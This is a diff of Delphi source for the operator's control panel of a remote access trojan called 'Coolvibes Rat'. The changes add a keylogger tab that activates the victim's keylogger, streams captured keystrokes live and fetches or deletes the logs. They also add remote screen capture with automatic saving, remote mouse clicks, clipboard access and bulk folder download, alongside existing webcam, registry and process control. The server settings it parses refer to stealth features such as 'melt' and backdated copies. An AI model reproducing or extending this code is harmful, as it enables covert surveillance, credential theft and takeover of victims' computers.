@@ -7,7 +7,7 @@ uses
   Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, ScktComp, Jpeg,
   UnitVariables, Spin, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
   IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, UnitTransfer,
-   UnitFormReg, ScreenMaxCap, UnitVisorDeMiniaturas, UnitFormSendKeys, UnitFunciones;
+   UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones, Shfolder,ShellAPI;
 
 type
   TFormControl = class(TForm)
@@ -33,10 +33,7 @@ type
     ListViewArchivos: TListView;
     EditPathArchivos: TEdit;
     TabRegistro: TTabSheet;
-    LabelPathRegistro: TLabel;
     BtnVerRegisto: TSpeedButton;
-    TreeViewRegedit: TTreeView;
-    ListViewRegistro: TListView;
     EditPathRegistro: TEdit;
     Mensajes: TTabSheet;
     MemoMensaje: TMemo;
@@ -125,14 +122,12 @@ type
     Agregaracoladedescarga1: TMenuItem;
     ComboBoxGestionDeServidor: TComboBox;
     BtnEnviarComandoServidor: TSpeedButton;
-    IconsArchivos: TImageList;
     ListViewInformacion: TListView;
     btnGuardarImagen: TSpeedButton;
     LabelPosicionCompresJpg: TLabel;
     LabelCalidadCapScreen: TLabel;
     BtnCapturarScreen: TSpeedButton;
     BtnVerGrandeCap: TSpeedButton;
-    BtnRelativo: TSpeedButton;
     ProgressBarScreen: TProgressBar;
     TrackBarCalidad: TTrackBar;
     CheckBoxMouseClicks: TCheckBox;
@@ -167,19 +162,34 @@ type
     N7:      TMenuItem;
     Iralproceso1: TMenuItem;
     Previsualizarjpg1: TMenuItem;
-    TamanoRelativoPopup: TPopupMenu;
-    N251: TMenuItem;
-    N501: TMenuItem;
-    N751: TMenuItem;
-    N1001: TMenuItem;
-    N8: TMenuItem;
-    Especificarmanualmente1: TMenuItem;
     TimerCamCapture: TTimer;
     CheckBoxAutoCamCapture: TCheckBox;
-    LabelCamAutomatico: TLabel;
     SpinCam: TSpinEdit;
     CheckBoxMostrarVentanasOcultas: TCheckBox;
-    LabelMostrarVentanasOcultas: TLabel;
+    PopupGuardarPantallaoWebcam: TPopupMenu;
+    Guardarimagen1: TMenuItem;
+    Guardadoautomtico1: TMenuItem;
+    TabKeylogger: TTabSheet;
+    RichEditKeylogger: TRichEdit;
+    IconsArchivos: TImageList;
+    SpeedButtonRecibirLog: TSpeedButton;
+    SpeedButtonEliminarLog: TSpeedButton;
+    SpeedButtonGuardarLog: TSpeedButton;
+    SpeedButtonActivarKeylogger: TSpeedButton;
+    EditLogName: TEdit;
+    ProgressBarKeylogger: TProgressBar;
+    N9: TMenuItem;
+    Abrircarpetadescargas1: TMenuItem;
+    CheckBoxOnlineKeylogger: TCheckBox;
+    PrevisualizarImagenes1: TMenuItem;
+    CheckBoxCompleta: TCheckBox;
+    Panel1: TPanel;
+    TreeViewRegedit: TTreeView;
+    ListViewRegistro: TListView;
+    Splitter1: TSplitter;
+    Portapapeles1: TMenuItem;
+    Copiar1: TMenuItem;
+    Pegar1: TMenuItem;
     procedure FormCreate(Sender: TObject);
     procedure BtnRefrescarProcesosClick(Sender: TObject);
     procedure BtnRefrescarVentanasClick(Sender: TObject);
@@ -225,7 +235,6 @@ type
     procedure Activar1Click(Sender: TObject);
     procedure Desactivar1Click(Sender: TObject);
     procedure TrackBarCalidadChange(Sender: TObject);
-    procedure btnGuardarImagenClick(Sender: TObject);
     procedure BtnCapturarScreen1Click(Sender: TObject);
     procedure Enviarteclas1Click(Sender: TObject);
     procedure TrackBarCalidadWebcamChange(Sender: TObject);
@@ -236,7 +245,6 @@ type
     procedure BtnActualizarServidorInfoClick(Sender: TObject);
     procedure BtnEnviarComandoServidorClick(Sender: TObject);
     procedure BtnVerGrandeCapClick(Sender: TObject);
-    procedure BtnRelativoClick(Sender: TObject);
     procedure TimerCaptureScreenTimer(Sender: TObject);
     procedure Descargarfichero1Click(Sender: TObject);
     procedure Borrarcompletados1Click(Sender: TObject);
@@ -270,7 +278,8 @@ type
     procedure PopupDescargasPopup(Sender: TObject);
     procedure DetenerDescarga1Click(Sender: TObject);
     procedure ReanudarDescarga1Click(Sender: TObject);
-    function ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS:Tmemorystream):string;
+    procedure ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
+    function  ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS:Tmemorystream):string;
     procedure Agregaracoladedescarga1Click(Sender: TObject);
     procedure EditPathArchivosKeyPress(Sender: TObject; var Key: char);
     procedure ListViewProcesosColumnClick(Sender: TObject; Column: TListColumn);
@@ -284,24 +293,47 @@ type
     procedure SpinCaptureScreenChange(Sender: TObject);
     procedure CheckBoxAutoCapturaScreenClick(Sender: TObject);
     procedure Previsualizarjpg1Click(Sender: TObject);
-    procedure Especificarmanualmente1Click(Sender: TObject);
-    procedure N1001Click(Sender: TObject);
-    procedure N751Click(Sender: TObject);
-    procedure N501Click(Sender: TObject);
-    procedure N251Click(Sender: TObject);
     procedure SpinCamChange(Sender: TObject);
     procedure CheckBoxAutoCamCaptureClick(Sender: TObject);
     procedure TimerCamCaptureTimer(Sender: TObject);
     procedure CheckBoxMostrarVentanasOcultasClick(Sender: TObject);
+    procedure Guardarimagen1Click(Sender: TObject);
+    procedure btnGuardarImagenClick(Sender: TObject);
+    procedure PopupGuardarPantallaoWebcamPopup(Sender: TObject);
+    procedure Guardadoautomtico1Click(Sender: TObject);
+    procedure TabKeyloggerShow(Sender: TObject);
+    procedure SpeedButtonRecibirLogClick(Sender: TObject);
+    procedure SpeedButtonActivarKeyloggerClick(Sender: TObject);
+    procedure SpeedButtonEliminarLogClick(Sender: TObject);
+    procedure CheckBoxOnlineKeyloggerClick(Sender: TObject);
+    procedure SpeedButtonGuardarLogClick(Sender: TObject);
+    procedure TabServidorShow(Sender: TObject);
+    procedure TabInfoShow(Sender: TObject);
+    procedure TabProcesosShow(Sender: TObject);
+    procedure TabVentanasShow(Sender: TObject);
+    procedure TabServiciosShow(Sender: TObject);
+    procedure TabFileManagerShow(Sender: TObject);
+    procedure TabScreencapShow(Sender: TObject);
+    procedure TabWebcamShow(Sender: TObject);
+    procedure FormCanResize(Sender: TObject; var NewWidth,
+      NewHeight: Integer; var Resize: Boolean);
+    procedure CheckBoxCompletaClick(Sender: TObject);
+    procedure PrevisualizarImagenes1Click(Sender: TObject);
+    procedure Copiar1Click(Sender: TObject);
+    procedure Pegar1Click(Sender: TObject);
   private  //Funciones y variables privadas que solo podemos usar en este Form
     Servidor: TIdPeerThread;
     //Variables para recibir ficheros
-    FormVisorDeMiniaturas: TFormVisorDeMiniaturas;
+    FormVisorDeMiniaturas: TObject;
     mslistviewitem : Tlistitem;
     RecibiendoFichero: boolean;
-    TamanoRelativo : integer;  //tamaño relativo de la captura de pantalla
     NombreSI, DescripcionSI, RutaSI: string;//EnviarInstalarservicios
     Columna, ColumnaOrdenada: integer;
+    PrefijoGuardarCaptura, PrefijoGuardarWebcam : string; //Para el guardado automático
+    InumeroCaptura, InumeroWebcam : integer;
+    AnchuraPantalla, AlturaPantalla : integer;//Altura y anchura de la pantalla del servidor
+    PrevisualizacionActiva : boolean; //activada o desactivada la previsualización
+    PortaPapeles : string;
     function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
     function IconNum(strExt: string): integer;
     procedure AniadirClavesARegistro(Claves: string);
@@ -328,7 +360,7 @@ var
 
 implementation
 
-uses UnitMain;
+uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas;
 {$R *.dfm}
 
 
@@ -340,8 +372,68 @@ begin
 end;
 
 procedure TFormControl.FormCreate(Sender: TObject);
+var
+  vFileInfo: TSHFileInfo;
+  vImgList : THandle;
+  Function FileIconInit(FullInit: BOOL): BOOL; stdcall;
+type
+TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
+var
+ShellDLL: HMODULE;
+PFileIconInit: TFileIconInit;
+begin
+Result := False;
+if (Win32Platform = VER_PLATFORM_WIN32_NT) then
+begin
+ShellDLL := LoadLibrary(PChar('shell32.dll'));
+PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
+if (Assigned(PFileIconInit)) then
+Result := PFileIconInit(FullInit);
+end;
+end;
 begin
   RecibiendoFichero := False;
+ { self.Constraints.MinHeight := 383;
+  self.Constraints.MinWidth := 569;  }
+
+{  TabBromas.Caption := '';
+  TabFileManager.Caption := '';
+  TabInfo.Caption := '';
+  TabKeylogger.Caption := '';
+  TabProcesos.Caption := '';
+  TabRegistro.Caption := '';
+  TabScreencap.Caption := '';
+  TabServicios.Caption := '';
+  TabServidor.Caption := '';
+  TabShell.Caption := '';
+  TabTransferencias.Caption := '';
+  TabVentanas.Caption := '';
+  TabWebcam.Caption := '';
+  TabMensajes.Caption := ''; }
+  FileIconInit(true);
+  vImgList := SHGetFileInfo(PChar(''),
+                    FILE_ATTRIBUTE_NORMAL,
+                    vFileInfo,
+                    SizeOf(vFileInfo),
+                   SHGFI_ICON or SHGFI_SMALLICON or
+                    SHGFI_SYSICONINDEX {or SHGFI_USEFILEATTRIBUTES    }
+                    );
+
+  SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_SMALL , vImgList);
+
+  DestroyIcon(vFileInfo.hIcon);
+  
+  vImgList := SHGetFileInfo(PChar(''),
+                    FILE_ATTRIBUTE_NORMAL,
+                    vFileInfo,
+                    SizeOf(vFileInfo),
+                    SHGFI_ICON or
+                    SHGFI_SYSICONINDEX {or SHGFI_USEFILEATTRIBUTES    }
+                    );
+
+  SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_NORMAL , vImgList);
+
+  DestroyIcon(vFileInfo.hIcon);
 end;
 
 procedure TFormControl.OnRead(command: string; AThread: TIdPeerThread);
@@ -377,6 +469,7 @@ begin
           Copy(Recibido, 1, Pos('|', Recibido) - 1);
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
+    BtnRefrescarInformacion.Enabled := true;
   end;
 
   //Comandos relacionados con la gestión del servidor
@@ -396,28 +489,34 @@ begin
         //Nombre
         Items[1].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
         Delete(Recibido, 1, Pos('|', Recibido));
-        for i := 3 to 5 do
-        begin
-          //IP, Puerto, Conectar Cada
-          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-          Delete(Recibido, 1, Pos('|', Recibido));
-        end;
-        for i := 7 to 11 do
+
+        Items[3].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+        Delete(Recibido, 1, Pos('|', Recibido));
+
+        for i := 5 to 9 do
         begin
           //bCopiar, NombreDeArchivo, Copiar a, melt, CopiarConFechaAnterior
           Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
           Delete(Recibido, 1, Pos('|', Recibido));
         end;
-        for i := 13 to 14 do
+        for i := 11 to 12 do
         begin
           //bPolicies, Nombre de la clave de Policies
           Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
           Delete(Recibido, 1, Pos('|', Recibido));
         end;
+        for i := 14 to 15 do
+        begin
+          //bPolicies, Nombre de la clave de Policies
+          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+
         //Ruta del servidor
-        Items[16].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+        Items[17].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
         Delete(Recibido, 1, Pos('|', Recibido));
       end;
+      BtnActualizarServidorInfo.enabled := true;
     end;
   end;
 
@@ -442,6 +541,7 @@ begin
       Item.SubItems.Add(TempStr);
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
+    BtnRefrescarProcesos.Enabled := true;
   end;
   //Listar Ventanas
   if Copy(Recibido, 1, 4) = 'WIND' then
@@ -466,6 +566,7 @@ begin
 
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
+     BtnRefrescarVentanas.Enabled := true;
   end;
 
   //Ir a proceso...
@@ -584,6 +685,7 @@ begin
     EditPathArchivos.Enabled := True;
     BtnActualizarArchivos.Enabled := True;
     StatusBar.Panels[1].Text := 'Unidades listadas.';
+    BtnVerUnidades.Enabled := True;
   end;
 
   if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
@@ -605,9 +707,10 @@ begin
     if Length(EditPathArchivos.Text) > 3 then
     begin
       Item := ListViewArchivos.Items.Add;
-      Item.ImageIndex := 0;
+      Item.ImageIndex := 3;
       Item.Caption := '<..>';
     end;
+    
     while Pos('|', Recibido) > 1 do
     begin
       TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
@@ -616,7 +719,7 @@ begin
       begin
         Delete(TempStr, 1, 1); //borra el #2
         Item := ListViewArchivos.Items.Add;
-        Item.ImageIndex := 1; //1 es el icono de carpeta cerrada
+        Item.ImageIndex := 3; //1 es el icono de carpeta cerrada
         Item.Caption := Copy(TempStr, 1, Pos(':', TempStr) - 1);
         Item.SubItems.Add('');
         Item.SubItems.Add('Carpeta de archivos');
@@ -646,7 +749,7 @@ begin
       a := 0;
       for i := 0 to ListViewArchivos.Items.Count - 1 do
       begin
-        if ListViewArchivos.Items[i].ImageIndex = 1 then
+        if ListViewArchivos.Items[i].ImageIndex = 3 then
           a := a + 1;
       end;
       LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
@@ -654,13 +757,14 @@ begin
       a := 0;
       for i := 0 to ListViewArchivos.Items.Count - 1 do
       begin
-        if (ListViewArchivos.Items[i].ImageIndex <> 1) then //si no es una carpeta...
+        if (ListViewArchivos.Items[i].ImageIndex <> 3) then //si no es una carpeta...
           a := a + 1;
       end;
       LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(a);
     end;
     ListViewArchivos.Items.EndUpdate;
     StatusBar.Panels[1].Text := 'Archivos listados.';
+    BtnActualizarArchivos.enabled := true;
   end;
 
   if Copy(Recibido, 1, 9) = 'GETFOLDER' then
@@ -694,6 +798,7 @@ begin
     Delete(Recibido, 1, 14);
     AniadirValoresARegistro(Recibido);
     Recibido := '';
+    BtnVerRegisto.enabled := true;
   end;
   if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
   begin
@@ -777,15 +882,90 @@ begin
       else
         item.ImageIndex := 45;
       Delete(Recibido, 1, Pos('|', Recibido));
+    end;
+    BtnServicios.enabled := true;
+  end;
 
+   if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
+  begin
+    Delete(Recibido, 1, Pos('|', Recibido));
+    if(copy(Recibido, 1, pos('|', Recibido) - 1) = 'ACTIVADO') then
+    begin
+
+      SpeedButtonRecibirLog.Enabled := true;
+      SpeedButtonGuardarLog.Enabled := true;
+      SpeedButtonEliminarLog.Enabled := true;
+      ProgressBarKeylogger.Enabled := true;
+      EditLogName.Enabled := false;
+      SpeedButtonActivarKeylogger.caption := 'Desactivar Keylogger';
+      SpeedButtonActivarKeylogger.enabled := true;
+      CheckBoxOnlineKeylogger.enabled := true;
+    end
+    else
+    begin
+      SpeedButtonRecibirLog.Enabled := false;
+      SpeedButtonGuardarLog.Enabled := false;
+      SpeedButtonEliminarLog.Enabled := false;
+      ProgressBarKeylogger.Enabled := false;
+      EditLogName.Enabled := true;
+      SpeedButtonActivarKeylogger.caption := 'Activar Keylogger';
+      SpeedButtonActivarKeylogger.enabled := true;
+      CheckBoxOnlineKeylogger.enabled := false;
+    end;
+    Delete(Recibido, 1, Pos('|', Recibido));
+    if(copy(Recibido, 1, pos('|', Recibido) - 1)<>'') then
+      EditLogName.Text := Extractfilename(copy(Recibido, 1, pos('|', Recibido) - 1));
+  end;
+
+  if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
+  begin
+    Delete(Recibido, 1, Pos('|', Recibido));
+    Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
+    Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
+    Recibido := StringReplace((Recibido),'|espacio|', ' ', [rfReplaceAll]); 
+    RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
+    
+    while pos(#10, Recibido) > 0 do
+    begin
+      TempStr := copy(Recibido, 1, pos(#10, Recibido));
+      Delete(Recibido, 1, Pos(#10, Recibido));
+      
+      if (Copy(TempStr, 1, 2) = '-[') then //evento
+      begin
+         RichEditKeylogger.SelAttributes.Style := [fsBold];
+         RichEditKeylogger.SelAttributes.Color := clRed;
+      end
+      else if (Copy(TempStr, 1, 2) = '-{') then
+      begin
+         RichEditKeylogger.SelAttributes.Style := [fsBold];
+         RichEditKeylogger.SelAttributes.Color := clgreen;
+      end
+      else
+      begin
+         RichEditKeylogger.SelAttributes.Style := [];
+         RichEditKeylogger.SelAttributes.Color := clblack;
+      end;
+        RichEditKeylogger.SelText := TempStr {+ #13+#10};
 
     end;
+    RichEditKeylogger.SelText := Recibido;
   end;
+
+  if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
+  begin
+    Delete(Recibido, 1, Pos('|', Recibido));
+    AnchuraPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
+    Delete(Recibido, 1, Pos('|', Recibido));
+    AlturaPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
+  end;
+
 end;
 
 function TFormControl.IconNum(strExt: string): integer;
+var
+  FileInfo : SHFILEINFO;
 begin
-  if (strExt = '.mp3') or (strExt = '.wav') or (strExt = '.ogg') or
+ { if (strExt = '.mp3') or (strExt = '.wav') or (strExt = '.ogg') or
     (strExt = '.midi') or (strExt = '.mid') or (strExt = '.cda') then
     Result := 25
   else if (strExt = '.avi') or (strExt = '.mpg') or (strExt = '.mpeg') or
@@ -816,12 +996,20 @@ begin
   else if (strExt = '.bmp') or (strExt = '.ico') then
     Result := 26
   else
-    Result := 2;
+    Result := 2;        }
+  SHGetFileInfo(PChar(UpperCase(ExtractFileExt(strext))),
+                    FILE_ATTRIBUTE_NORMAL,
+                    FileInfo,
+                    SizeOf(FileInfo),
+                    SHGFI_ICON or SHGFI_SMALLICON or
+                    SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
+        Result := FileInfo.iIcon;  
 end;
 
 //Boton obtener información
 procedure TFormControl.BtnRefrescarInformacionClick(Sender: TObject);
 begin
+  BtnRefrescarInformacion.Enabled := false;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('INFO')
   else
@@ -831,6 +1019,7 @@ end;
 //Boton obtener procesos
 procedure TFormControl.BtnRefrescarProcesosClick(Sender: TObject);
 begin
+  BtnRefrescarProcesos.Enabled := false;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('PROC')
   else
@@ -868,6 +1057,7 @@ end;
 //Boton obtener ventanas
 procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
 begin
+   BtnRefrescarVentanas.Enabled := true;
   if Servidor.Connection.Connected then
   begin
     if(CheckBoxMostrarVentanasOcultas.Checked) then
@@ -1081,6 +1271,7 @@ end;
 //Funciones del FileManager
 procedure TFormControl.BtnVerUnidadesClick(Sender: TObject);
 begin
+  BtnVerUnidades.Enabled := false;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('VERUNIDADES')
   else
@@ -1121,9 +1312,9 @@ begin
         Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
       Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
     end
-    else if ListViewArchivos.Selected.ImageIndex = 1 then //doble-clickiò una carpeta
+    else if ListViewArchivos.Selected.ImageIndex = 3 then //doble-clickiò una carpeta
     begin
-      ListViewArchivos.Selected.ImageIndex := 0;  //Icono de carpeta abierta
+      ListViewArchivos.Selected.ImageIndex := 4;  //Icono de carpeta abierta
       EditPathArchivos.Text :=
         EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
       Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
@@ -1143,26 +1334,27 @@ var
 begin
   if ListViewArchivos.Selected <> nil then //Algún item seleccionado
   begin
-    if (ListViewArchivos.Selected.ImageIndex = 1) then  //Es una carpeta
+    if (ListViewArchivos.Selected.ImageIndex = 3) then  //Es una carpeta
     begin
-      //PopupFileManager.Items[0].Enabled := False;  //No Descargar
+      PopupFileManager.Items[0].Enabled := True;  //Descargar!
       PopupFileManager.Items[1].Enabled := False;  //No Encolar Descarga
       PopupFileManager.Items[4].Enabled := False;  //No ejecutar
-      PopupFileManager.Items[8].Enabled := False;  //No Previsualizar jpg
+      PopupFileManager.Items[9].Enabled := False;  //No Previsualizar jpg
     end
     else  //Viceversa
     begin
       PopupFileManager.Items[0].Enabled := True;
       PopupFileManager.Items[1].Enabled := True;
       PopupFileManager.Items[4].Enabled := True;
+      PopupFileManager.Items[9].Enabled := True;  //No Previsualizar jpg
     end;
-    PopupFileManager.Items[4].Enabled := True;  //Eliminar
-    PopupFileManager.Items[5].Enabled := True;  //Cambiar nombre
-    PopupFileManager.Items[6].Enabled := True;  //Nueva carpeta
+    PopupFileManager.Items[5].Enabled := True;  //Eliminar
+    PopupFileManager.Items[6].Enabled := True;  //Cambiar nombre
+    PopupFileManager.Items[7].Enabled := True;  //Nueva carpeta
     ext := ExtractFileExt(ListViewArchivos.Selected.Caption);
     if (lowercase(ext) = '.jpg') or (lowercase(ext) = '.jpeg') then
     begin
-      PopupFileManager.Items[8].Enabled := True; //Previsualizar jpg
+      PopupFileManager.Items[9].Enabled := True; //Previsualizar jpg avanzado
     end;
   end
   else  //Si no se ha seleccionado ningún item
@@ -1173,7 +1365,7 @@ begin
     PopupFileManager.Items[4].Enabled := False; //Deshabilitar Eliminar
     PopupFileManager.Items[5].Enabled := False; //Deshabilitar Cambiar nombre
     PopupFileManager.Items[6].Enabled := False; //Deshabilitar Cambiar nombre
-    PopupFileManager.Items[8].Enabled := False; //Previsualizar jpg
+    PopupFileManager.Items[9].Enabled := False; //Previsualizar jpg avanzado
     if EditPathArchivos.Text = '' then
       //Si no está en ningún Path deshabilitar crear carpeta
       PopupFileManager.Items[7].Enabled := False;
@@ -1183,8 +1375,6 @@ end;
 
 procedure TFormControl.Normal1Click(Sender: TObject);
 begin
-
-
   if Servidor.Connection.Connected then
   begin
     mslistviewitem := ListViewArchivos.Selected;
@@ -1222,7 +1412,7 @@ begin
     mslistviewitem := ListViewArchivos.Selected;
     while Assigned(mslistviewitem) do
     begin
-      if mslistviewitem.ImageIndex = 1 then
+      if mslistviewitem.ImageIndex = 3 then
       begin
         if MessageDlg('¿Está seguro que quiere borrar la carpeta ' +
         mslistviewitem.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
@@ -1236,6 +1426,7 @@ begin
         mslistviewitem.Caption);
       mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
       end;
+    btnactualizararchivos.Click;
   end
   else
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
@@ -1314,6 +1505,7 @@ begin
         DirName := DirName + '\';
       Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
     end;
+    btnactualizararchivos.Click;
   end
   else
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
@@ -1321,7 +1513,7 @@ end;
 
 procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
 begin
-
+  BtnActualizarArchivos.Enabled := false;
   if not Servidor.Connection.Connected then
   begin
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
@@ -1431,6 +1623,8 @@ end;
 
 procedure TFormControl.BtnVerRegistoClick(Sender: TObject);
 begin
+  if EditPathRegistro.text = '' then exit;
+  BtnVerRegisto.enabled := false;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text)
   else
@@ -1642,23 +1836,6 @@ begin
 end;
 
 
-procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
-begin
-  DlgGuardar.Title      := 'Guardar imagen ::Coolvibes Rat::';
-  DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := 'Imagen .Jpeg|*.jpg';
-  DlgGuardar.DefaultExt := 'jpg';
-  if DlgGuardar.Execute then
-  begin
-    if TSpeedButton(Sender).Name = 'btnGuardarImagen' then
-      //Se está guardando una captura
-      imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
-    else  //Sino es una webcam
-      imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
-    StatusBar.Panels[1].Text := 'Imagen guardada como: ' + DlgGuardar.FileName;
-  end;
-end;
-
 procedure TFormControl.Enviarteclas1Click(Sender: TObject);
 //Enviar teclas a una ventana....
 var
@@ -1705,7 +1882,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    //MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -1728,15 +1905,17 @@ begin
 
   if CheckBoxMouseClicks.Checked then
   begin
-    if(tamanorelativo <> 100) then //necesitamos el tamaño de la pantalla para calcular la posicion real.
+
+    if(anchurapantalla = 0) then //necesitamos el tamaño de la pantalla para calcular la posicion real.
     begin
-      MessageDlg('Establece el tamaño relativo a 100 para realizar clicks remotos', mtWarning, [mbOK], 0);
+      MessageDlg('Pide una captura primero!', mtWarning, [mbOK], 0);
       exit;
     end;
-    AnchoCap := imgCaptura.Picture.Width;
-    AltoCap := imgCaptura.Picture.Height;
-    X := (X * AnchoCap) div imgCaptura.Width; //Una regla de tres
-    Y := (Y * AltoCap) div imgCaptura.Height;
+    
+    AnchoCap := AnchuraPantalla;
+    AltoCap := AlturaPantalla;
+    X := (X * AnchoCap) div (imgCaptura.Width); //Una regla de tres
+    Y := (Y * AltoCap) div (imgCaptura.Height);
     if button = mbLeft then
       Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
         IntToStr(y) + '|' + 'CLICKIZQ' + '|')
@@ -1748,6 +1927,7 @@ end;
 
 procedure TFormControl.BtnActualizarServidorInfoClick(Sender: TObject);
 begin
+  BtnActualizarServidorInfo.enabled := false;
   if Servidor.connection.Connected then
     Servidor.connection.writeln('SERVIDOR|INFO|')
   else
@@ -1790,56 +1970,18 @@ procedure TFormControl.BtnVerGrandeCapClick(Sender: TObject);
 var
   NewScreenMax: TScreenMax;
 begin
-  tamanorelativo := 100;//recibimos las capturas al 100%
   NewScreenMax := TScreenMax.Create(self, ImgCaptura.Picture, Servidor,
     CheckBoxMouseClicks.Checked);
   NewScreenMax.ShowModal; //Form para mostrar la captura más grande...
 end;
 
 
-
-procedure TFormControl.BtnRelativoClick(Sender: TObject);
-var
-  popupPoint : TPoint;
-begin
-
-
-  if tamanorelativo <> 0 then
-  begin
-  ImgCaptura.AutoSize := False;
-  ImgCaptura.Stretch  := True;
-  ImgCaptura.Height   := ScrollBoxCapScreenM.Height - 5;
-  ImgCaptura.Width    := ScrollBoxCapScreenM.Width - 5;
-  imgCaptura.Anchors  := [akLeft, akTop, akRight, akBottom];
-  //Para que cambie de tamaño si cambia la form
-  imgCaptura.Align    := alClient;
-  BtnRelativo.Caption := 'T.Relativo';
-  tamanorelativo := 0;
-  end
-  else
-  begin
-  BtnRelativo.Caption := 'Auto';
-  popupPoint.X := BtnRelativo.left;
-  popupPoint.Y := BtnRelativo.top;
-  popupPoint := ClientToScreen(popupPoint) ;
-
-  TamanoRelativoPopup.popup(popupPoint.X, popupPoint.Y) ;
-
-    imgCaptura.AutoSize := True;
-  imgcaptura.Stretch  := False;
-  imgCaptura.Anchors  := [akLeft, akTop];
-  //Para que no cambie de tamaño y aparezcan las scrollbars
-  imgCaptura.Align    := alNone;
-end;
-
-end;
-
 procedure TFormControl.TimerCaptureScreenTimer(Sender: TObject);
 begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+   // MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
     self.TimerCaptureScreen.Enabled := False;
     exit;
   end;
@@ -1863,10 +2005,9 @@ while Assigned(mslistviewitem) do
 begin
 
    FilePath := Trim(EditPathArchivos.Text) + Trim(mslistviewitem.Caption);
-  if (mslistviewitem.ImageIndex = 1) then
+  if (mslistviewitem.ImageIndex = 3) then
   begin
-    Pagecontrol.ActivePage := TabTransferencias;
-    sleep(1000);
+    PageControl.activepage := TabTransferencias;
     Servidor.Connection.Writeln('GETFOLDER|' + FilePath+'\');
   end
   else
@@ -1891,6 +2032,12 @@ begin
   if not Servidor.Connection.Connected then
   begin
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    exit;
+  end;
+
+  if EditPathArchivos.Text = '' then
+  begin
+    MessageDlg('Entra al directorio primero!', mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -1970,7 +2117,10 @@ begin
   else if Copy(PChar(Buffer), 1, 9) = 'CAPSCREEN' then
   begin
     Delete(Buffer, 1, Pos('|', Buffer));
-    //FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
+    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
+    AnchuraPantalla := strtoint(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
+    Delete(FilePath, 1, Pos('¬', FilePath));
+    AlturaPantalla := strtoint(FilePath);
     Delete(Buffer, 1, Pos('|', Buffer));
     Size := StrToInt(Trim(Buffer));
 
@@ -1985,10 +2135,17 @@ begin
     MS.Position := 0;
     JPG := TJPEGImage.Create;
     JPG.LoadFromStream(MS);
-
